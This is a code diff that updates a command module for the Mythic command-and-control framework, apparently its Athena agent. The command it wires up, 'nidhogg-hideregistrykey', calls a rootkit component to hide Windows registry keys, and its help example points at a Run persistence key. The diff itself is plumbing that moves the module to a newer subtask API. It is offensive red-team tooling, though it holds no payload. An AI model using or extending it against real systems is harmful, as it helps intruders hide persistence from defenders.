@@ -1,5 +1,6 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+from ..athena_utils.bof_utilities import *
 
 class NNidhoggHideRegistryKeyArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
@@ -26,7 +27,7 @@ class NNidhoggHideRegistryKeyArguments(TaskArguments):
         else:
             raise ValueError("Missing arguments")
 
-class NidhoggHideRegistryKeyCommand(CommandBase):
+class NidhoggHideRegistryKeyCommand(CoffCommandBase):
     cmd = "nidhogg-hideregistrykey"
     needs_admin = False
     help_cmd = """nidhogg-hideregistrykey HKLM\\software\\microsoft\\windows\\currentversion\\run\\test"""
@@ -48,13 +49,19 @@ class NidhoggHideRegistryKeyCommand(CommandBase):
             Success=True,
         )
 
-        resp = await MythicRPC().execute("create_subtask_group", tasks=[
-            {"command": "nidhogg", "params": {"command":"hideregistrykey", "path":taskData.args.get_arg("path")}},
-            ], 
-            subtask_group_name = "nidhogg", parent_task_id=taskData.Task.ID)
-
+        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
+            taskData.Task.ID, 
+            CommandName="nidhogg",
+            SubtaskCallbackFunction="coff_completion_callback",
+            Params=json.dumps({
+                "command": "hideregistrykey",
+                "path": taskData.args.get_arg("path")
+            }),
+            Token=taskData.Task.TokenID,
+        ))
+        
         # We did it!
         return response
 
-    async def process_response(self, response: AgentResponse):
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         pass
